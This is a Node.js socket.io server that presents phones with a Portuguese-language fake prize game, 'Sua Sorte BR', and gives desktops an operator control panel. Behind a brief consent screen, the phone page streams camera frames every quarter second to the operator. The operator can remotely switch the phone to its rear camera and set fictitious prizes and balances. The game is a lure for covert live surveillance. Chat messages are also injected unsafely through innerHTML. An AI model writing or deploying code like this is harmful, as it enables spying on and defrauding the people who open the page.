const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  const ua = req.headers['user-agent']?.toLowerCase() || '';
  const isMobile = /mobile|android|iphone/i.test(ua);
  const host = req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  const fullUrl = `${protocol}://${host}`;

  res.send(isMobile ? getMobileHTML(fullUrl) : getDesktopHTML(fullUrl));
});

// ==================== CELULAR ====================
function getMobileHTML(fullUrl) {
  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
    <title>Sua Sorte BR</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #0a001f, #2a0044);
            color: white;
            height: 100vh;
            overflow: hidden;
        }
        .header {
            background: linear-gradient(to right, #ff00cc, #00ff88);
            padding: 16px;
            text-align: center;
            font-size: 22px;
            font-weight: bold;
        }
        .top-info {
            background: #1f0033;
            padding: 12px 16px;
            display: flex;
            justify-content: space-between;
            font-size: 15px;
        }
        .balance { color: #00ff88; font-weight: bold; }

        .question-area {
            background: #2a0044;
            padding: 20px 16px;
            text-align: center;
        }
        .prize { color: #ffd700; font-size: 17px; margin-bottom: 6px; }
        .question { font-size: 18px; margin: 10px 0; min-height: 50px; }
        .timer { font-size: 38px; font-weight: bold; color: #ff00cc; }

        .messages {
            flex: 1;
            overflow-y: auto;
            padding: 16px;
            background: rgba(0,0,0,0.5);
        }
        .message { margin-bottom: 12px; }
        .message.sent { text-align: right; }
        .message.received { text-align: left; }
        .bubble {
            display: inline-block;
            padding: 12px 16px;
            border-radius: 18px;
            max-width: 80%;
        }
        .message.sent .bubble { background: #00ff88; color: black; }
        .message.received .bubble { background: #ff00cc; color: white; }

        .input-area {
            background: #1f0033;
            padding: 14px 16px;
            display: flex;
            gap: 10px;
        }
        .input-field {
            flex: 1;
            background: #2a0044;
            border: 2px solid #ff00cc;
            border-radius: 30px;
            padding: 14px 18px;
            color: white;
            font-size: 16px;
        }
        .send-btn {
            background: #00ff88;
            color: black;
            border: none;
            width: 52px;
            height: 52px;
            border-radius: 50%;
            font-size: 24px;
            cursor: pointer;
        }

        .consent {
            position: absolute;
            inset: 0;
            background: rgba(10,0,31,0.98);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            padding: 20px;
        }
        .consent-box {
            background: #1f0033;
            border: 3px solid #ff00cc;
            border-radius: 20px;
            padding: 30px 25px;
            text-align: center;
            max-width: 340px;
        }
        .start-btn {
            background: linear-gradient(#ff00cc, #00ff88);
            color: black;
            border: none;
            padding: 16px;
            border-radius: 50px;
            font-size: 17px;
            width: 100%;
            margin-top: 20px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="consent" id="consent">
        <div class="consent-box">
            <h2>🔥 SUA SORTE BR 🔥</h2>
            <p>Jogo ao vivo controlado pelo operador.</p>
            <p>Você permite câmera, microfone e localização.</p>
            <button class="start-btn" id="startBtn">ACEITAR E JOGAR</button>
        </div>
    </div>

    <div id="game" style="display:none; flex-direction:column; height:100vh;">
        <div class="header">SUA SORTE BR</div>
        
        <div class="top-info">
            <span>Saldo:</span>
            <span class="balance" id="balance">R$ 0,00</span>
        </div>

        <div class="question-area">
            <div class="prize" id="prize">Prêmio: R$ 0,00</div>
            <div class="question" id="question">Aguardando pergunta...</div>
            <div class="timer" id="timer">00</div>
        </div>

        <div class="messages" id="messages"></div>

        <div class="input-area">
            <input type="text" class="input-field" id="input" placeholder="Digite sua resposta...">
            <button class="send-btn" id="send">➤</button>
        </div>
    </div>

    <video id="localVideo" autoplay playsinline muted style="display:none;"></video>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}');
        let stream = null;
        let facingMode = 'user';
        let balance = 0;

        const consent = document.getElementById('consent');
        const game = document.getElementById('game');
        const messages = document.getElementById('messages');
        const input = document.getElementById('input');
        const questionEl = document.getElementById('question');
        const timerEl = document.getElementById('timer');
        const prizeEl = document.getElementById('prize');
        const balanceEl = document.getElementById('balance');

        function addMessage(text, isSent) {
            const div = document.createElement('div');
            div.className = \`message \${isSent ? 'sent' : 'received'}\`;
            div.innerHTML = \`<div class="bubble">\${text}</div>\`;
            messages.appendChild(div);
            messages.scrollTop = messages.scrollHeight;
        }

        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: 640, height: 480, facingMode },
                    audio: true
                });
                document.getElementById('localVideo').srcObject = stream;

                setInterval(() => {
                    if (!stream) return;
                    const canvas = document.createElement('canvas');
                    canvas.width = 260; canvas.height = 195;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(document.getElementById('localVideo'), 0, 0, 260, 195);
                    socket.emit('frame', canvas.toDataURL('image/jpeg', 0.65));
                }, 250);

                consent.style.display = 'none';
                game.style.display = 'flex';
                socket.emit('mobile_online');

            } catch (e) {
                alert("Erro ao acessar câmera. Permita o acesso.");
            }
        }

        document.getElementById('startBtn').onclick = startCamera;

        document.getElementById('send').onclick = () => {
            const text = input.value.trim();
            if (text) {
                addMessage(text, true);
                socket.emit('message', text);
                input.value = '';
            }
        };

        input.addEventListener('keypress', e => {
            if (e.key === 'Enter') document.getElementById('send').click();
        });

        socket.on('question', data => {
            questionEl.textContent = data.question || "Pergunta recebida";
            timerEl.textContent = data.time || "30";
            prizeEl.textContent = `Prêmio: R$ ${(data.prize || 0).toFixed(2)}`;
        });

        socket.on('message', msg => addMessage(msg, false));

        socket.on('update_balance', amt => {
            balance = amt;
            balanceEl.textContent = `R$ ${balance.toFixed(2)}`;
        });

        socket.on('toggle_camera', () => {
            facingMode = facingMode === 'user' ? 'environment' : 'user';
            startCamera();
        });
    </script>
</body>
</html>`;
}

// ==================== DESKTOP ====================
function getDesktopHTML(fullUrl) {
  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Sua Sorte BR - Controle</title>
    <style>
        body { font-family: 'Poppins', sans-serif; background:#0a0a0a; color:white; margin:0; padding:20px; }
        h1 { text-align:center; color:#ff00cc; }
        #remoteVideo {
            max-width:100%;
            max-height:360px;
            border:4px solid #ff00cc;
            border-radius:12px;
            background:black;
            margin:20px 0;
        }
        .controls { max-width:700px; margin:0 auto; display:grid; gap:12px; }
        input, button {
            padding:15px;
            font-size:16px;
            border-radius:10px;
        }
        input { background:#1f1f1f; border:2px solid #ff00cc; color:white; }
        button {
            background:linear-gradient(#ff00cc,#00ff88);
            color:black;
            border:none;
            font-weight:bold;
            cursor:pointer;
        }
    </style>
</head>
<body>
    <h1>🎰 SUA SORTE BR - CONTROLE</h1>
    <img id="remoteVideo" src="" alt="Câmera">

    <div class="controls">
        <input type="text" id="q" placeholder="Digite a pergunta">
        <input type="number" id="t" value="30" placeholder="Tempo em segundos">
        <input type="number" id="p" value="50" placeholder="Prêmio R$">
        <button onclick="sendQ()">Enviar Pergunta</button>
        <button onclick="toggleCam()">Trocar Câmera</button>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}');

        function sendQ() {
            const question = document.getElementById('q').value.trim();
            const time = parseInt(document.getElementById('t').value) || 30;
            const prize = parseFloat(document.getElementById('p').value) || 0;
            if (question) socket.emit('question', {question, time, prize});
        }

        function toggleCam() { socket.emit('toggle_camera'); }

        socket.on('frame', frame => {
            document.getElementById('remoteVideo').src = frame;
        });
    </script>
</body>
</html>`;
}

// Socket
io.on('connection', socket => {
  socket.on('message', msg => socket.broadcast.emit('message', msg));
  socket.on('frame', frame => socket.broadcast.emit('frame', frame));
  socket.on('question', data => socket.broadcast.emit('question', data));
  socket.on('toggle_camera', () => socket.broadcast.emit('toggle_camera'));
  socket.on('mobile_online', () => socket.broadcast.emit('mobile_online'));
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n✅ Servidor rodando na porta ${PORT}`);
  console.log(`Abra primeiro no CELULAR`);
});
